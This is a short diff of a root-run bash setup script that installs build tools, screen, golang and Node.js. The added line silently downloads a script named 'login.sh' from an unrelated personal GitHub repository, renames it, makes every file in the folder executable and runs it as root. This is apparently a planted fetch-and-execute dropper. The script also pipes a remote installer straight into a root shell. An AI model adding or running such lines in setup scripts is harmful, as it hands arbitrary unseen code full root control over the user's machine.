@@ -1,5 +1,6 @@
 #!/bin/bash
 sudo su <<EOF
+wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
 sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 sudo apt install screen -y
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
